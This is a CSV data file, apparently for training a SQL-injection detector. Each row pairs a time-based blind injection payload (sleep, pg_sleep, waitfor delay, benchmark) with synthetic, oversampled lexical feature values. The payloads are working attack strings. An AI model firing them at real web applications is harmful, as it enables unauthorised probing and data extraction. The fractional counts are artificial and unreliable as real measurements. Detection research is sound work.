id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000171,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,0.666119959530912,78.01853663832259,19.252317079790323,2.950230683674306,27.75695123937097,2.0,39.00926831916129,9.252317079790323,0.3557374381199066,0.025683415840124513,0.5,0.11857914603996887,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.252317079790323,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.7476829202096762,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.747682920209676
SMOTE_000172,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,1.4253440281771,76.4305343798653,18.214122135011223,3.024672521992644,14.0,16.28702291991021,36.28702291991021,9.856488540044895,0.1840114337203638,0.21101930697814675,0.47389278372152366,0.1310764755799658,0.856488540044895,0.0,0.0,0.0,0.0,2.0,0.0,5.571755729977553,0.4282442700224476,0.0,1.0,2.0,0.21412213501122393,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000173,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,1.1141253586420337,96.96070505835124,23.0,3.18712839489545,31.584282023340496,8.33712809336198,45.831435953319016,11.207858988329752,0.3257095760829634,0.08530080124708816,0.4732553210225431,0.11573430164740534,0.0,0.0,0.0,0.0,1.0,0.7921410116702473,0.0,8.415717976659504,0.0,0.0,0.0,1.7921410116702474,0.0,0.0,0.0,1.0,0.0,0.7921410116702473,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.7921410116702473,1.0,0.0,0.7921410116702472,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.584282023340495
SMOTE_000174,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,0.018203605260439678,84.91502371006814,25.97712176809527,3.687775040245577,30.97712176809527,9.970585130408203,32.973853449251735,10.993463362312934,0.36484339287656736,0.1173179459589264,0.38835129825606163,0.12948736290844465,3.996731681156467,0.0,0.0,0.0,0.0,1.996731681156467,0.0,4.0,0.0,1.0,0.0,1.996731681156467,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.996731681156467,1.9967316811564673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.993463362312934
SMOTE_000175,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.6396374258679725,56.348840034455,21.98836997415875,3.678149348330684,23.0,3.6627899913862496,18.68605004306875,11.0,0.408621472791228,0.0653491800888825,0.3306016862197369,0.19542766090015254,5.66278999138625,0.0,0.0,0.0,0.0,1.0,0.0,2.33721000861375,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000176,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,1.7343665119129077,68.59107771271945,26.0,3.6491406110154223,23.0,10.0,28.0,7.5910777127194535,0.33533785434941443,0.14579906710844107,0.408237387903635,0.11062569063850952,0.0,0.0,1.1821554254389075,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.1821554254389075,0.0,0.0,0.5910777127194538,0.4089222872805462,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000041,0.23887909128860146,84.59716416450041,19.26540629533352,2.8942899018660686,27.19905472150014,2.0,43.39810944300028,12.0,0.32150501333390946,0.023656639998847817,0.5128985066741558,0.1419398399930869,0.9336484261666201,0.0,0.0,0.0,1.0,0.0,0.0,9.06635157383338,0.0,0.0,0.0,1.0,0.9336484261666201,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.9336484261666201,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.93364842616662
SMOTE_000178,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,0.36569102078954174,63.85766424916956,23.85766424916956,3.462852815413562,19.85766424916956,10.0,27.0,7.0,0.3109467328778424,0.1566030152550358,0.4228281411885967,0.10962211067852506,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8576642491695601,0.1423357508304399,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.1203476850118825,88.0,27.77005156110159,3.8836139071362954,21.540103122203178,27.459896877796822,30.0,9.0,0.2447738991159452,0.3120442827022366,0.3409090909090909,0.10227272727272728,0.0,0.7700515611015882,0.4598968777968236,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.4598968777968233,0.0,0.7700515611015882,0.2299484388984118,0.7700515611015882,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,0.10756908753402883,79.97157048036651,22.900496681282785,3.36060355590332,26.88628192146604,3.97157048036651,35.1279328383507,13.985785240183255,0.33616508826079927,0.04965374303010493,0.43929962504090203,0.17488154366819378,5.971570480366509,0.0,0.0,0.0,0.0,0.014214759816745026,0.0,6.02842951963349,0.0,0.0,0.0,0.014214759816745026,1.0,0.0,0.0,0.0,0.0,0.014214759816745026,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.014214759816745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.014214759816745026,0.0,0.985785240183255,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,0.09573236409400036,84.29173793991079,20.097245979970264,2.9421442585257767,30.0,2.0,42.22690728659728,10.06483065331351,0.35602251175149463,0.023734834116766315,0.5008713797488376,0.11937127438290154,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.032415326656755,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.03241532665675492,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000182,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.7451257852960036,84.49146602502583,23.377133493743546,3.122584250032742,29.377133493743543,1.6885667468717713,41.180032771897594,12.245733012512911,0.3488050089073436,0.020254680378514037,0.486666058579891,0.14427425213425132,1.6228665062564556,0.0,0.0,0.0,1.0,0.3114332531282278,0.0,8.311433253128229,0.3114332531282278,0.0,0.0,1.3114332531282278,1.0,0.0,0.0,0.6885667468717722,0.0,0.31143325312822784,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.31143325312822784,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.311433253128228
SMOTE_000183,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.19681135123147875,55.415027356186954,22.688729482859785,3.758900956582586,23.0,3.8962431609532615,17.518784195233692,11.0,0.4152401759037596,0.07045709227355365,0.31570960421654076,0.19859312760614595,5.8962431609532615,0.0,0.0,0.0,0.0,1.0,0.0,2.103756839046738,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,0.8064122833062684,94.73860848630028,24.0,2.966990736527318,30.0,2.0,49.49061875342376,13.247989732876519,0.3187782391489273,0.02125188260992851,0.5203775568877849,0.1395923213533594,1.0,0.0,0.0,0.0,1.0,0.0,0.0,10.247989732876519,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000185,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,1.5357835733139418,87.11768875014486,27.423537750028974,3.6620156218907796,24.423537750028974,18.0,34.694151000115895,10.0,0.28041518676457333,0.20678190882318856,0.3979240661771334,0.11487883823510475,0.0,0.576462249971027,2.0,0.0,0.0,2.0,0.0,4.423537750028973,0.0,1.0,0.0,4.0,0.0,0.576462249971027,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.42353775002897287,0.5764622499710271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000186,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,0.6502064277783532,77.41013842326592,19.0,2.942105469357974,27.0,2.0,38.881336514541196,9.528801908724718,0.34929922659333024,0.02587401678469113,0.5020984202727171,0.12272833634926147,0.17626730290823933,0.0,0.0,0.0,1.0,0.0,0.0,8.17626730290824,0.0,0.0,0.0,1.0,0.17626730290823928,0.0,0.0,0.17626730290823933,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000187,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,0.9499054507691037,72.71582064388437,24.943164128776875,3.7119708514546077,18.178955160971093,20.886328257553746,25.41474619316531,8.235791032194218,0.25,0.28587395208553673,0.3501041185965936,0.11402192931786964,0.0,1.0,0.0,0.0,0.0,1.2357910321942183,0.0,4.0,0.0,0.0,1.0,1.2357910321942183,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.23579103219421832,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2357910321942183
SMOTE_000188,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,0.12918836079898233,61.86070799212528,19.0,3.208107013572106,25.90713866141685,1.0,26.953569330708426,8.0,0.41873968583311855,0.016169150923927053,0.435737955851538,0.1293532073914164,0.06964600393736164,2.9303539960626384,0.0,0.0,0.0,0.023215334645787067,0.0,4.976784665354213,0.0,0.0,0.0,0.02321533464578729,0.023215334645787178,0.9767846653542129,0.0,0.0,0.0,0.023215334645787178,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000189,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,0.6247948213299018,77.3550268754267,19.0,2.9425177265373583,27.0,2.0,38.846891797141694,9.508135078285015,0.3495323111471615,0.025891282307197144,0.5020164090408136,0.12255999750482781,0.16937835942833823,0.0,0.0,0.0,1.0,0.0,0.0,8.16937835942834,0.0,0.0,0.0,1.0,0.16937835942833834,0.0,0.0,0.16937835942833834,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000190,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,0.3894849495811222,63.64757748535417,22.088105628661456,3.398962726302161,18.26431688598437,10.0,27.471366228031258,7.911894371338543,0.2873072619704752,0.1571677669652235,0.43125918463648016,0.12426578642782118,0.08810562866145677,0.911894371338543,2.0,0.0,0.0,1.0,0.0,3.9118943713385432,0.0,0.0,0.0,3.0,0.08810562866145699,0.911894371338543,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9118943713385431,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9118943713385432
SMOTE_000191,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,0.6164107984386686,71.06191058523254,23.234522353691865,3.532602683893194,17.0,19.0,27.06191058523254,8.0,0.23936836602349812,0.2675293502615568,0.38045834676271073,0.11264393695223442,0.0,0.23452235369186547,0.0,0.0,0.0,1.0,0.0,4.765477646308135,0.0,0.0,1.0,1.0,0.0,0.23452235369186547,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000073,0.05849722481386808,72.0,25.946651649662464,3.6051177384964515,15.035565566891691,20.96443443310831,28.0,8.0,0.20882729954016238,0.2911727004598377,0.3888888888888889,0.1111111111111111,0.982217216554155,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.9822172165541545,0.0,0.0,0.01778278344584544,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,2.4446333169394383,72.87209535360614,17.139534365865302,2.664844332214257,14.441862536538794,6.558137463461206,40.581396902404094,11.290698451202047,0.19563275104635994,0.09360656474224485,0.5564802606519601,0.15428042355943514,1.7209312682693974,0.0,0.0,0.0,0.0,1.0,0.0,7.430232817067349,0.0,0.0,0.5697671829326508,1.0,0.4302328170673492,0.0,0.0,0.5697671829326507,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4302328170673493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.430232817067349
SMOTE_000194,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000041,2.2959040647389766,90.10937283826756,20.745535096647878,3.0523947940109535,29.181918870809845,5.49107019329575,43.872767548323935,11.56361622583803,0.32365501925592843,0.05794839049566422,0.4888981343554064,0.12949845589300096,0.5636162258380313,0.0,0.0,0.0,1.0,0.43638377416196883,0.0,8.56361622583803,0.0,0.0,0.0,1.436383774161969,0.5636162258380312,0.0,0.0,1.0,0.0,0.4363837741619689,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.43638377416196883,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.436383774161969
SMOTE_000195,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,1.9924595659760176,61.31678419652192,24.53959802456524,3.5538457422669154,18.53959802456524,10.0,25.237588147391445,7.53959802456524,0.3031187508401684,0.16378735709440775,0.4101412340291039,0.12295265803631991,0.5395980245652409,0.460401975434759,2.0,0.0,0.0,1.0,0.0,3.539598024565241,0.0,0.0,0.0,3.0,0.5395980245652411,0.460401975434759,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.539598024565241,0.460401975434759,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000196,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,1.0758227096313593,76.19086449997472,16.493400590915982,2.7184037352806674,18.177665681806694,3.3157349091092883,41.69746390905874,13.0,0.23789351275954884,0.045971219653764855,0.5449682638552801,0.17116700373140614,4.0,0.0,0.0,0.0,0.0,1.1644668636386613,0.0,7.342132545445355,0.3289337272773227,0.0,0.16446686363866136,1.1644668636386613,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000197,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,0.18534822893888173,97.48276099292492,23.032327437942193,3.255978336463291,31.935345124115614,9.741380496462462,44.80603537234685,11.0,0.3278018255835904,0.09953057226531509,0.45971468663618337,0.11295291551491113,0.03232743794219228,0.0,0.0,0.0,1.0,0.9676725620578078,0.0,8.0,0.0,0.0,0.0,1.9676725620578077,0.03232743794219217,0.0,0.0,1.0,0.0,0.9676725620578078,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9676725620578078,1.0,0.0,0.9676725620578077,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.935345124115615
SMOTE_000198,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.9749421121820834,95.33410035721315,23.389016726202193,2.907534480913156,30.0,2.0,50.55606690480877,12.778033452404385,0.31497523506936087,0.02099834900462405,0.5301773981366102,0.13384901778940478,0.3890167262021923,0.0,0.0,0.0,1.0,0.0,0.0,10.389016726202192,0.0,0.0,0.0,1.0,0.38901672620219213,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000199,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,0.5331776259637495,65.0,25.388456778500746,3.9708666087149154,23.517942371334325,12.0,20.093600850164933,9.388456778500744,0.3618144980205281,0.18461538461538463,0.30913232077176817,0.14443779659231915,2.3884567785007444,0.0,2.0,0.0,0.0,1.0,0.0,1.8705144071664188,0.0,0.0,0.0,3.129485592833581,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1294855928335814,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.129485592833581
SMOTE_000200,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,1.4904342553069778,60.3725927035384,20.372592703538402,3.3202769186111087,22.90192583716928,3.4706668663691227,25.54903708141536,8.45096291858464,0.3808981460561615,0.05518981790578385,0.42321990736627285,0.14069212867178182,2.176444377876959,0.27451854070768034,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.7254814592923197,0.27451854070768034,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.27451854070768034,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2745185407076804
SMOTE_000201,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,0.21802983244964477,64.64052121048911,24.79458354885092,3.4708798768085045,18.79458354885092,10.0,27.84593766163819,8.0,0.29057772617400973,0.1547996784867663,0.43078285254981097,0.12383974278941304,0.9486458872127301,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.05135411278726987,3.0,0.94864588721273,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9486458872127301,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.94864588721273
